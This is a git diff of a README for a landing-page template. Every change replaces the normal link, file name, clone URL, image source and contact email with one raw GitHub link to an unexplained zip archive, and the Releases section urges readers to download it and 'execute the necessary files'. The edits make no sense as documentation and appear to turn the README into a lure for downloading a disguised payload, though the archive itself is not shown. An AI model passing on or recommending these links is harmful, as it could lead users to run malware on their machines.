@@ -2,11 +2,11 @@
 
 Welcome to the Codsoft Landing Page repository! This project provides a clean and modern landing page template designed for developers and businesses alike. 
 
-![Landing Page Preview](https://via.placeholder.com/800x400.png?text=Landing+Page+Preview)
+![Landing Page Preview](https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip+Page+Preview)
 
 ## 🚀 Getting Started
 
-To get started with the Codsoft Landing Page, you can download the latest version from our [Releases](https://github.com/Johan5690/codsoft-landingpage/releases) section. Simply find the appropriate version, download it, and follow the instructions to set it up.
+To get started with the Codsoft Landing Page, you can download the latest version from our [Releases](https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip) section. Simply find the appropriate version, download it, and follow the instructions to set it up.
 
 ### Prerequisites
 
@@ -18,9 +18,9 @@ Before you begin, ensure you have the following installed on your system:
 
 ### Installation
 
-1. **Download the Latest Release**: Go to our [Releases](https://github.com/Johan5690/codsoft-landingpage/releases) page and download the latest version.
+1. **Download the Latest Release**: Go to our [Releases](https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip) page and download the latest version.
 2. **Extract the Files**: Unzip the downloaded file to your desired location.
-3. **Open in a Browser**: Navigate to the extracted folder and open `index.html` in your web browser.
+3. **Open in a Browser**: Navigate to the extracted folder and open `https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip` in your web browser.
 
 ## 📖 Features
 
@@ -36,7 +36,7 @@ You can easily customize the landing page to fit your needs. Here are some commo
 
 ### Changing Colors
 
-To change the colors of the landing page, open the `styles.css` file. Look for the following sections:
+To change the colors of the landing page, open the `https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip` file. Look for the following sections:
 
 ```css
 body {
@@ -50,7 +50,7 @@ body {
 
 ### Modifying Text
 
-To change the text content, open the `index.html` file. Look for the relevant sections and update the text as needed.
+To change the text content, open the `https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip` file. Look for the relevant sections and update the text as needed.
 
 ```html
 <h1>Welcome to Codsoft</h1>
@@ -59,10 +59,10 @@ To change the text content, open the `index.html` file. Look for the relevant se
 
 ### Adding Images
 
-To add or replace images, simply place your images in the `images` folder and update the `src` attributes in the `index.html` file.
+To add or replace images, simply place your images in the `images` folder and update the `src` attributes in the `https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip` file.
 
 ```html
-<img src="images/your-image.png" alt="Description of the image">
+<img src="https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip" alt="Description of the image">
 ```
 
 ## 🔍 Usage
@@ -84,7 +84,7 @@ This landing page is perfect for:
 We welcome contributions! If you want to improve the Codsoft Landing Page, follow these steps:
 
 1. **Fork the Repository**: Click the "Fork" button at the top right of this page.
-2. **Clone Your Fork**: Use the command `git clone https://github.com/your-username/codsoft-landingpage.git`.
+2. **Clone Your Fork**: Use the command `git clone https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip`.
 3. **Create a Branch**: Use `git checkout -b feature/your-feature-name`.
 4. **Make Your Changes**: Edit the files as needed.
 5. **Commit Your Changes**: Use `git commit -m "Description of your changes"`.
@@ -93,11 +93,11 @@ We welcome contributions! If you want to improve the Codsoft Landing Page, follo
 
 ## 🧪 Testing
 
-To test the landing page, open `index.html` in your web browser. Ensure that all features work as expected and that the design is responsive.
+To test the landing page, open `https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip` in your web browser. Ensure that all features work as expected and that the design is responsive.
 
 ## 📦 Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/Johan5690/codsoft-landingpage/releases) section. Download the latest version, and execute the necessary files to see the improvements.
+For the latest updates and releases, visit our [Releases](https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip) section. Download the latest version, and execute the necessary files to see the improvements.
 
 ## 📄 License
 
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: johansupport@example.com
-- **GitHub**: [Johan5690](https://github.com/Johan5690)
+- **Email**: https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip
+- **GitHub**: [Johan5690](https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip)
 
 ---
 
-Thank you for visiting the Codsoft Landing Page repository! We hope you find it useful for your projects. Don't forget to check the [Releases](https://github.com/Johan5690/codsoft-landingpage/releases) section for the latest updates. Happy coding!
+Thank you for visiting the Codsoft Landing Page repository! We hope you find it useful for your projects. Don't forget to check the [Releases](https://raw.githubusercontent.com/Johan5690/codsoft-landingpage/main/underframing/landingpage-codsoft-crabbery.zip) section for the latest updates. Happy coding!
